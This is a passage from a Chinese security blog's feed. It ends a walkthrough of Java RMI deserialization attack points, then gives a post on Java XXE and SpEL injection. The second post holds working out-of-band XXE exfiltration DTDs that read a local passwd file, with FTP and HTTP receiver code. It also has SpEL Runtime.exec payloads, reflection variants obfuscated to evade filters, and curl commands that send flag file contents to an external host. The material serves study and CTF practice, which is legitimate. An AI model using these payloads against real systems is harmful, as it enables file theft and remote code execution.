alt="image-20230517180745527"></p><p>在unmarshalValue里也会判断类型，假如不是java的原始类型（就里边嵌的if里的那几种），那么就会到else里，对获得的in进行反序列化</p><p>这里是String，是引用类型，所以不满足判断，进行反序列化</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230517181430200.png" alt="image-20230517181430200"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230517181114974.png" alt="image-20230517181114974"></p><p><strong>这里就是服务端攻击客户端的攻击点</strong></p><h3 id="攻击点"><a href="#攻击点" class="headerlink" title="攻击点"></a>攻击点</h3><p>这部分也是有两个攻击点，一个就是UnicastRef里调用的call.executeCall()</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230517181900132.png" alt="image-20230517181900132"></p><p>另一个就上边说的在unmarshalValue里如果值不是原始类型，就会进入else里对服务端返回的内容进行反序列化</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230517182219155.png" alt="image-20230517182219155"></p><h2 id="客户端请求服务端-注册中心"><a href="#客户端请求服务端-注册中心" class="headerlink" title="客户端请求服务端-注册中心"></a>客户端请求服务端-注册中心</h2><p>这里要先知道断点下在哪</p><p>之前我们说客户端操作stub，服务端操作skel，所以断点应该下在skel里边</p><p>但是我们还是需要知道对应的位置</p><p>在创建注册中心的时候，我们调用了listen方法进行的网络监听</p><p>这里是开启了一个新线程</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230517210146097.png" alt="image-20230517210146097"></p><p>那监听肯定就是在这个线程完成的事，我们看里面的run方法</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230517210323047.png" alt="image-20230517210323047"></p><p>里面只有一个方法，再跟进去</p><p>这里又创建了一个线程池，跟进到ConnectionHandler的run方法</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230517210428800.png" alt="image-20230517210428800"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230517210617154.png" alt="image-20230517210617154"></p><p>这个里边主要就是调用了run0</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230517210937227.png" alt="image-20230517210937227"></p><p>在run0里注册中心已经开始解析客户端传过来的一些东西了，但是重点在这</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230517211011579.png" alt="image-20230517211011579"></p><p>run0调用了handleMessages方法</p><p>这里会根据传过来的值做一些操作</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230517211113798.png" alt="image-20230517211113798"></p><p>默认情况下会调用serviceCall</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230517211203786.png" alt="image-20230517211203786"></p><p>serviceCall里就是取出我们之前存入的target，可以把断点下在这里</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230517211323775.png" alt="image-20230517211323775"></p><p>可以看到程序断在这了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230517211418515.png" alt="image-20230517211418515"></p><p>然后程序会获取target里的disp</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230517211604644.png" alt="image-20230517211604644"></p><p>可以看到是同一个disp</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230517211702532.png" alt="image-20230517211702532"></p><p>然后再到这一步，调用disp.dispatch</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230517211746985.png" alt="image-20230517211746985"></p><p>这里就相当于调用UnicastServerRef类里的dispatch方法</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230517211923803.png" alt="image-20230517211923803"></p><p>skel不为空，进入oldDispatch里</p><p>在oldDispatch里又会调用skel.dispatch</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230517212104703.png" alt="image-20230517212104703"></p><p>终于进入到skel中了</p><p>这里边有个switch方法</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230517212313270.png" alt="image-20230517212313270"></p><p>0对应bind</p><p>1对应list</p><p>2对应lookup</p><p>3对应rebind</p><p>4对应unbind</p><p>这里我们因为客户端用了lookup方法，所以这里应该是进入case 2里</p><p>这里接收了客户端传过来的内容，之前说了客户端传的时候调用了writeObject，也就是序列化的形式传的，那接收的时候肯定要调用readObject进行反序列化，因此这里有可能成为客户端攻击注册中心的攻击点</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230517212536229.png" alt="image-20230517212536229"></p><h2 id="客户端请求服务端-服务端"><a href="#客户端请求服务端-服务端" class="headerlink" title="客户端请求服务端-服务端"></a>客户端请求服务端-服务端</h2><p>断点的位置和上一步一样，因为服务端和注册中心在一起，他们又都要处理网络请求</p><p>同样要到UnicastServerRef的dispatch里，不同的是这是skel为空</p><p>所以它就会继续往下走，走到这里</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230517213234558.png" alt="image-20230517213234558"></p><p>这里就也是判断参数，然后如果存在，就进入umarsharValue</p><p>，这里就和客户端请求服务端的时候的客户端一样了。只不过那里是客户端反序列化服务端返回的内容，这里是服务端反序列化客户端传入的内容</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230517213808438.png" alt="image-20230517213808438"></p><p>在之后就是真正调用方法了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230517213900720.png" alt="image-20230517213900720"></p><p>然后就是再把调用后的结果进行序列化，然后又传回客户端</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230517214046532.png" alt="image-20230517214046532"></p><h2 id="客户端请求服务端-dgc"><a href="#客户端请求服务端-dgc" class="headerlink" title="客户端请求服务端-dgc"></a>客户端请求服务端-dgc</h2><p>最后一个部分，关于dgc的流程</p><p>这里其实在第一部分创建远程对象的时候就写了一点，不过我已经忘干净了（</p><p>RMI 定义了一个 <code>java.rmi.dgc.DGC</code> 接口，提供了两个方法 <code>dirty</code> 和 <code>clean</code>：</p><ul><li>客户端想要使用服务端上的远程引用，使用 <code>dirty</code> 方法来注册一个。同时这还跟租房子一样，过段时间继续用的话还要再调用一次来续租。</li><li>客户端不使用的时候，需要调用 <code>clean</code> 方法来清楚这个远程引用。</li></ul><p>DGC就是RMI里垃圾回收机制，具体介绍如下：</p><blockquote><p>分布式垃圾回收，又称 DGC，RMI 使用 DGC 来做垃圾回收，因为跨虚拟机的情况下要做垃圾回收没办法使用原有的机制。我们使用的远程对象只有在客户端和服务端都不受引用时才会结束生命周期。</p><p>而既然 RMI 依赖于 DGC 做垃圾回收，那么在 RMI 服务中必然会有 DGC 层，在 yso 中攻击 DGC 层对应的是 JRMPClient，在攻击 RMI Registry 小节中提到了 skel 和 stub 对应的 Registry 的服务端和客户端，同样的，DGC 层中也会有 skel 和 stub 对应的代码，也就是 DGCImpl_Skel 和 DGCImpl_Stub，我们可以直接从此处分析，避免冗长的 debug。</p></blockquote><p>总之dgc的具体作用就是垃圾回收的，然后他也有他对应的DGCImpl_Skel 和 DGCImpl_Stub</p><p>然后调用的话也是会到UnicastServerRef的dispatch里</p><p>再到UnicastServerRef的oldDispatch，然后执行DGCImpl_Skel的dispatch方法</p><p>这里有反序列化点</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230517224231611.png" alt="image-20230517224231611"></p><p>然后再说一下DGCImpl_Stub</p><p>在客户端上会调用DGCImpl_Stub</p><blockquote><p>客户端lookup也会产生DGC通讯。（其实大多操作都会有DGC</p></blockquote><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230517233058591.png" alt="image-20230517233058591"></p><p>在DGCImpl_Stub有clean和dirty两个方法，简单来看就都是垃圾回收的作用</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230517230549181.png" alt="image-20230517230549181"></p><p>而这两个方法里都调用了invoke</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230517230631766.png" alt="image-20230517230631766"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230517230639216.png" alt="image-20230517230639216"></p><p>这就和客户端请求注册中心的攻击点二是一样的了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230517233242936.png" alt="image-20230517233242936"></p><p>然后还有一点就是DGCImpl_Skel 里的switch的两个分支代表的就是DGCImpl_Stub的dirty和clean方法</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230517232221342.png" alt="image-20230517232221342"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这篇主要就讲一下rmi整个的流程，虽然还有一些地方不太清楚，<del>但感觉写的还凑合吧</del>，至于利用的部分还是再开一篇吧。</p><p>坦白讲目前我也不太清楚rmi的攻击是怎么实现的，因为我感觉这里如果要伪造rmi客户端进行攻击，那首先就需要知道服务端定义的远程对象的接口形式才能去传参。更何况这个远程对象还是绑定在本地的，不太清楚能不能绑到远程。而如果伪造服务端，那被攻击的客户端需要恰好调用这个伪造的服务端的方法，从直觉上来说应该不会有一个客户端去故意请求一个攻击者所在的服务器的方法吧。也许是在已经拿下rmi服务端的时候利用（？</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://su18.org/post/rmi-attack/">https://su18.org/post/rmi-attack/</a></p><p><a href="https://boogipop.com/2023/03/02/%E6%B5%85%E5%AD%A6RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">浅学RMI反序列化 | Boogiepop Doesn&#39;t Laugh (boogipop.com)</a></p><p><a href="https://www.bilibili.com/video/BV1L3411a7ax/">Java反序列化RMI专题-没有人比我更懂RMI_哔哩哔哩_bilibili</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web学习 </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java安全</title>
      <link href="/2023/04/20/Java%E5%AE%89%E5%85%A8/"/>
      <url>/2023/04/20/Java%E5%AE%89%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<p>找到了些其他师傅写的java漏洞文章，打算照着这些文章挨个看下去了，这篇博客就算个整合吧，放点有用但是又不值得单独开一章的那种</p><h2 id="XML注入之DocumentBuilder与XXE攻击防御"><a href="#XML注入之DocumentBuilder与XXE攻击防御" class="headerlink" title="XML注入之DocumentBuilder与XXE攻击防御"></a>XML注入之DocumentBuilder与XXE攻击防御</h2><p>参考文章：<a href="https://www.mi1k7ea.com/2019/02/13/XML%E6%B3%A8%E5%85%A5%E4%B9%8BDocumentBuilder/">XML注入之DocumentBuilder与XXE攻击防御  Mi1k7ea ]</a></p><h3 id="DocumentBuilder"><a href="#DocumentBuilder" class="headerlink" title="DocumentBuilder"></a>DocumentBuilder</h3><p>DocumentBuilder是Java中常用的XML文档解析工具，是基于 DOM（Document Object Model，文档对象模型）的解析方式，把整个XML文档加载到内存并转化成DOM树，因此应用程序可以随机访问DOM树的任何数据。因此其优点是灵活性强、速度快； 缺点是消耗资源比较多。</p><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>简单来说就是DocumentBuilder可以解析xml，也能解析xml的各种实体，导致的xml的注入，触发xxe漏洞</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230420151851965.png" alt="image-20230420151851965"></p><p>因此就可以结合xxe的一些攻击方式去进行攻击</p><h3 id="说一下盲带"><a href="#说一下盲带" class="headerlink" title="说一下盲带"></a><strong>说一下盲带</strong></h3><p>两种，一种是ftp，一种是http</p><p>先说ftp</p><p>先在本地开一个ftp服务</p><pre class="language-java" data-language="java"><code class="language-java">import java.io.IOException;import java.io.PrintWriter;import java.net.ServerSocket;import java.net.Socket;import java.util.NoSuchElementException;import java.util.Scanner;public class LocalFtpServer &#123;    private static final int PORT &#x3D; 2121;    private static final String RETR &#x3D; &quot;RETR&quot;;    private static final String CWD &#x3D; &quot;CWD&quot;;    private static final String TYPE &#x3D; &quot;TYPE&quot;;    private static final String JUNK1 &#x3D; &quot;EPSV&quot;;    private static final String JUNK2 &#x3D; &quot;EPRT&quot;;    private static final String LIST &#x3D; &quot;LIST&quot;;    public static void main(String[] args) throws IOException &#123;        ServerSocket socket &#x3D; new ServerSocket(PORT);        while (true) &#123;            Socket client &#x3D; socket.accept();            new Thread(new Runnable() &#123;                @Override                public void run() &#123;                    StringBuilder sb &#x3D; new StringBuilder();                    boolean startRecord &#x3D; false;                    try &#123;                        PrintWriter remoteSender &#x3D; new PrintWriter(client.getOutputStream(), true);                        Scanner remoteReader &#x3D; new Scanner(client.getInputStream(), &quot;UTF-8&quot;);                        &#x2F;&#x2F; FTP 的命令一般是 \r\n 作为一行的结束                        remoteReader.useDelimiter(&quot;\r\n&quot;);                        remoteSender.println(&quot;220 xxe-ftp-server&quot;);                        while (true) &#123;                            String line &#x3D; remoteReader.nextLine();                            System.out.println(&quot;&gt; &quot; + line);                            if (line.startsWith(&quot;USER&quot;)) &#123;                                remoteSender.println(&quot;331 password please - version check&quot;);                            &#125; else &#123;                                remoteSender.println(&quot;230 more data please!&quot;);                            &#125;                            if (!startRecord) &#123;                                if (line.startsWith(TYPE))                                    startRecord &#x3D; true;                            &#125; else &#123;                                if (line.startsWith(RETR)) &#123;                                    sb.append(&#39;&#x2F;&#39;).append(line.replace(&quot;RETR &quot;, &quot;&quot;));                                    client.setSoTimeout(3000);                                    String tail &#x3D; remoteReader.nextLine();                                    System.out.println(&quot;&gt; &quot; + tail);                                    sb.append(&#39;\n&#39;).append(tail);                                    break;                                &#125; else if (line.startsWith(JUNK1) || line.startsWith(JUNK2)) &#123;                                    &#x2F;&#x2F; nothing                                &#125; else if (line.startsWith(CWD)) &#123;                                    sb.append(&#39;&#x2F;&#39;).append(line.replace(&quot;RETR &quot;, &quot;&quot;).replace(&quot;CWD &quot;, &quot;&quot;));                                &#125; else if (line.startsWith(LIST)) &#123;                                    sb.append(&#39;&#x2F;&#39;);                                    break;                                &#125; else &#123;                                    sb.append(&#39;\n&#39;).append(line.replace(&quot;RETR &quot;, &quot;&quot;));                                &#125;                            &#125;                        &#125;                        client.close();                    &#125; catch (NoSuchElementException e) &#123;                        e.printStackTrace();                    &#125; catch (IOException e) &#123;                        e.printStackTrace();                    &#125;                    &#x2F;&#x2F; 为了兼容 CWD ，开头多补充了一个斜杠                    System.out.println(&quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;File Content&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;);                    String fileContent;                    fileContent &#x3D; sb.substring(1);                    System.out.println(fileContent);                    System.out.println(&quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;File Content&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;);                &#125;            &#125;).start();        &#125;    &#125;&#125;</code></pre><p>存在xxe漏洞的代码</p><pre class="language-java" data-language="java"><code class="language-java">public class LocalEntityDemo &#123;    public static void main(String[] args) throws ParserConfigurationException, IOException, SAXException, org.xml.sax.SAXException &#123;        DocumentBuilderFactory dbf &#x3D; DocumentBuilderFactory.newInstance();        DocumentBuilder builder &#x3D; dbf.newDocumentBuilder();        Document doc &#x3D; builder.parse(new File(&quot;src&#x2F;main&#x2F;resources&#x2F;user.xml&quot;));&#x2F;&#x2F;        NodeList nodes &#x3D; doc.getChildNodes();&#x2F;&#x2F;        for (int i &#x3D; 0; i &lt; nodes.getLength(); i++) &#123;&#x2F;&#x2F;            if (nodes.item(i).getNodeType() &#x3D;&#x3D; Node.ELEMENT_NODE) &#123;&#x2F;&#x2F;                System.out.println(nodes.item(i).getTextContent());&#x2F;&#x2F;            &#125;&#x2F;&#x2F;        &#125;    &#125;&#125;</code></pre><p>user.xml</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">ANY</span><span class="token punctuation">[</span><span class="token internal-subset">        &lt;!ENTITY % file SYSTEM "file:///d:/passwd.txt">        &lt;!ENTITY % remote SYSTEM "http://127.0.0.1:8000/test.dtd">        %remote;        %all;        </span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&send;">&amp;send;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre><p>test.dtd</p><pre class="language-dtd" data-language="dtd"><code class="language-dtd">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#39;ftp:&#x2F;&#x2F;127.0.0.1:2121&#x2F;%file;&#39;&gt;&quot;&gt;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230420211618905.png" alt="image-20230420211618905"></p><p>需要低版本的jdk，至少要小于8u161</p><p>否则会直接因为不合法的ftp命令导致报错</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230420211754607.png" alt="image-20230420211754607"></p><p>也就不能读取全部的信息了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230420211828514.png" alt="image-20230420211828514"></p><p>然后是http的，这个只能读一行，多了就寄给你看</p><p>httpserver</p><pre class="language-java" data-language="java"><code class="language-java">import com.sun.net.httpserver.HttpExchange;import com.sun.net.httpserver.HttpHandler;import com.sun.net.httpserver.HttpServer;import com.sun.net.httpserver.spi.HttpServerProvider;import java.io.IOException;import java.io.OutputStream;import java.io.OutputStreamWriter;import java.net.HttpURLConnection;import java.net.InetSocketAddress;import java.net.URLDecoder;import java.nio.charset.StandardCharsets;public class LocalHttpServer &#123;    public static void main(String[] args) throws IOException &#123;        HttpServerProvider provider &#x3D; HttpServerProvider.provider();        HttpServer httpserver &#x3D; provider.createHttpServer(new InetSocketAddress(1234), 100);        httpserver.createContext(&quot;&#x2F;&quot;, new MyResponseHandler());        httpserver.setExecutor(null);        httpserver.start();        System.out.println(&quot;server started&quot;);    &#125;    public static class MyResponseHandler implements HttpHandler &#123;        @Override        public void handle(HttpExchange httpExchange) throws IOException &#123;            System.out.println(&quot;Receive Request Start&quot;);            String requestMethod &#x3D; httpExchange.getRequestMethod();            if (requestMethod.equalsIgnoreCase(&quot;GET&quot;)) &#123;                System.out.println(URLDecoder.decode(httpExchange.getRequestURI().toString(), &quot;UTF-8&quot;));                String response &#x3D; &quot;&quot;;                httpExchange.sendResponseHeaders(HttpURLConnection.HTTP_OK, response.getBytes(StandardCharsets.UTF_8).length);                OutputStream responseBody &#x3D; httpExchange.getResponseBody();                OutputStreamWriter writer &#x3D; new OutputStreamWriter(responseBody, StandardCharsets.UTF_8);                writer.write(response);                writer.close();                responseBody.close();            &#125;            System.out.println(&quot;Receive Request End&quot;);        &#125;    &#125;&#125;</code></pre><p>test.dtd</p><pre class="language-dtd" data-language="dtd"><code class="language-dtd">&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;127.0.0.1:1234&#x2F;%file;&#39;&gt;&quot;&gt;</code></pre><p>其他的不改也行</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230420214057080.png" alt="image-20230420214057080"></p><p>多一行就去世</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230420214115858.png" alt="image-20230420214115858"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230420214129269.png" alt="image-20230420214129269"></p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>还有什么<a href="https://www.mi1k7ea.com/2019/05/26/XML%E6%B3%A8%E5%85%A5%E4%B9%8BSAXBuilder/">SAXBuilder的xxe</a>，<a href="https://www.mi1k7ea.com/2019/05/26/XML%E6%B3%A8%E5%85%A5%E4%B9%8BSAXParser/">SAXParser的xxe</a>，<a href="https://www.mi1k7ea.com/2019/05/24/XML%E6%B3%A8%E5%85%A5%E4%B9%8BSAXReader/">SAXReader的xxe</a></p><p>感觉都差不多</p><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><p><a href="https://www.mi1k7ea.com/2019/06/09/%E6%8E%A2%E8%AE%A8XXE%E9%98%B2%E5%BE%A1%E4%B9%8BsetFeature%E8%AE%BE%E7%BD%AE/">探讨XXE防御之setFeature设置</a></p><blockquote><ul><li>如果disallow-doctype-decl设置为true，无法Bypass；</li><li>如果external-general-entities设置为false，则只能解析内部实体而无法解析外部实体，此时能利用的只有XXE DoS攻击，但要看具体的JDK版本；</li><li>如果external-parameter-entities设置为false，则解析内部实体、外部普通实体而无法解析外部参数实体，此时可以进行外部普通实体的形式来攻击或者XXE DoS；</li><li>如果load-external-dtd设置为false，则解析内部实体、外部参数实体而无法解析外部普通实体，此时可以进行外部参数实体的形式来攻击或者XXE DoS；</li></ul></blockquote><h2 id="SpEL注入漏洞"><a href="#SpEL注入漏洞" class="headerlink" title="SpEL注入漏洞"></a>SpEL注入漏洞</h2><p>参考文章：<a href="http://rui0.cn/archives/1015">Code-Breaking Puzzles — javacon WriteUp - Ruilin (rui0.cn)</a></p><p><a href="https://www.mi1k7ea.com/2019/03/17/SpEL%E6%B3%A8%E5%85%A5%E4%B9%8Bjavacon/#SpEL%E8%AF%AD%E6%B3%95%E2%80%94%E2%80%94%E7%B1%BB%E7%9B%B8%E5%85%B3%E8%A1%A8%E8%BE%BE%E5%BC%8F">SpEL注入之javacon</a></p><h3 id="SpEL"><a href="#SpEL" class="headerlink" title="SpEL"></a>SpEL</h3><blockquote><p>Spring Expression Language（简称 SpEL）是一种功能强大的表达式语言、用于在运行时查询和操作对象图；语法上类似于 Unified EL，但提供了更多的特性，特别是方法调用和基本字符串模板函数。SpEL 的诞生是为了给 Spring 社区提供一种能够与 Spring 生态系统所有产品无缝对接，能提供一站式支持的表达式语言。</p><p>SpEL语言，可以用于Spring Framework中的表达式语言，通常用于在运行时计算值，它支持访问和操作对象的属性，方法调用，操作符，条件等。下面是每行的具体作用：</p></blockquote><h3 id="SpEL使用方式"><a href="#SpEL使用方式" class="headerlink" title="SpEL使用方式"></a>SpEL使用方式</h3><blockquote><p>SpEL 在求表达式值时一般分为四步，其中第三步可选：首先构造一个解析器，其次解析器解析字符串表达式，在此构造上下文，最后根据上下文得到表达式运算后的值。</p></blockquote><pre class="language-java" data-language="java"><code class="language-java">&#x2F;&#x2F;构造一个解析器ExpressionParser parser &#x3D; new SpelExpressionParser();&#x2F;&#x2F;解析器解析字符串表达式Expression expression &#x3D; parser.parseExpression(&quot;(&#39;Hello&#39; + &#39; Mi1k7ea&#39;).concat(#end)&quot;);&#x2F;&#x2F;构造上下文,可以不写，默认存在。但是默认的实例不会包含任何自定义的变量或函数。因此，如果表达式需要引用自定义的变量或函数，还是需要定义的。（这里的自定义变量和函数是指例如#root和#this变量，以及一些基本的函数，如toString()和getClass()函数，而不是在前边自己定义的字符串EvaluationContext context &#x3D; new StandardEvaluationContext();context.setVariable(&quot;end&quot;, &quot;!&quot;);&#x2F;&#x2F;通过 Expression 接口的 getValue 方法根据上下文获得表达式值System.out.println(expression.getValue(context));</code></pre><p>使用”T(Type)”来表示 java.lang.Class 实例，”Type”必须是类全限定名，”java.lang”包除外，即该包下的类可以不指定包名；使用类类型表达式还可以进行访问类静态方法及类静态字段。</p><p>所以可以借这个方式来调用exec</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230420162627504.png" alt="image-20230420162627504"></p><h3 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h3><p>全局搜索<code>org.springframework.expression.spel.standard</code>或<code>expression.getValue()</code>、<code>expression.setValue()</code>，再分析代码中传入的参数是否可控。</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>正常Windows本地利用反射方式弹计算器</p><pre class="language-java" data-language="java"><code class="language-java">String.class.getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;exec&quot;,String[].class).invoke(String.class.getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(String.class.getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)), (Object) new String[]&#123;&quot;cmd&quot;,&quot;&#x2F;C&quot;,&quot;calc&quot;&#125;);</code></pre><p>（原博客这里getMethod的参数是String.class，后面还穿了个字符数组类型的，怎么可能跑起来啊</p><p>使用spEL的方式</p><p>主要就是加个T（）</p><pre class="language-none"><code class="language-none">正常就是：T(java.lang.Runtime).getRuntime().exec(&#39;curl yourip:port&#x2F;?c&#x3D;&#96;cat flag&#96;&#39;)还可以用的StreamUtils包的copy()方法实现输入输出流来构造回显exp即可。T(org.springframework.util.StreamUtils).copy(T(java.lang.Runtime).getRuntime().exec(&#39;cat flag.txt&#39;).getInputStream(),T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream())</code></pre><blockquote><p>这个StreamUtils包是spring里的，如果maven的pom.xml里导入了</p><p><dependency>    <groupId>org.springframework.boot</groupId>    <artifactId>spring-boot-starter-web</artifactId> </dependency></p><p>或者导入了</p><dependency>   <groupId>org.springframework</groupId>   <artifactId>spring-core</artifactId>   <version>5.3.9</version></dependency><p>并且还有</p><dependency>   <groupId>org.springframework</groupId>   <artifactId>spring-web</artifactId>   <version>5.3.1</version></dependency><p>就可以试试去利用这个包整点有回显的文件读取</p></blockquote><p>如果有过滤可以试试反射的方式</p><pre class="language-java" data-language="java"><code class="language-java">import org.springframework.expression.Expression;import org.springframework.expression.ExpressionParser;import org.springframework.expression.ParserContext;import org.springframework.expression.common.TemplateParserContext;import org.springframework.expression.spel.standard.SpelExpressionParser;import org.springframework.expression.spel.support.StandardEvaluationContext;import java.lang.reflect.InvocationTargetException;public class calc &#123;    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException &#123;        &#x2F;&#x2F;创建一个SpEL表达式解析器。        ExpressionParser parser &#x3D; new SpelExpressionParser();        String test &#x3D; &quot;#&#123;T(String).getClass().forName(\&quot;java.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;).getMethod(\&quot;ex\&quot;+\&quot;ec\&quot;,T(String[])).invoke(T(String).getClass().forName(\&quot;java.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;).getMethod(\&quot;getRu\&quot;+\&quot;ntime\&quot;).invoke(T(String).getClass().forName(\&quot;java.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;)),new String[]&#123;\&quot;cmd\&quot;,\&quot;&#x2F;C\&quot;,\&quot;calc\&quot;&#125;)&#125;&quot;;        &#x2F;&#x2F;创建一个模板解析上下文。不传入的话会有默认的解析器，但是只支持一些基本的表达式，比如简单的算术运算、字符串操作、逻辑运算等等        ParserContext parserContext &#x3D; new TemplateParserContext();        Expression exp &#x3D; parser.parseExpression(test,parserContext);        StandardEvaluationContext evaluationContext &#x3D; new StandardEvaluationContext();        exp.getValue(evaluationContext).toString();    &#125;&#125;</code></pre><p>然后这里还有几种其他的方式<a href="https://blog.csdn.net/weixin_43610673/article/details/125941767">Javaweb安全——表达式注入（EL+SpEL）_Arnoldqqq的博客-CSDN博客</a></p><p>这里其实有个例题是p牛的javacon，但是我不想做（</p><p>看上面的参考文章吧，顺便说一下看wp得到的一个curl外带的技巧</p><pre class="language-txt" data-language="txt"><code class="language-txt">curl fg5hme.ceye.io&#x2F;&#96;cat flag_j4v4_chun|base64|tr &#39;\n&#39; &#39;-&#39;&#96;</code></pre><p>把带出来的东西base64编码，然后用tr把换行替换成-，解决了curl外带只能带一行的问题</p>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2022-22965</title>
      <link href="/2023/04/10/CVE-2022-22965/"/>
      <url>/2023/04/10/CVE-2022-22965/</url>
      
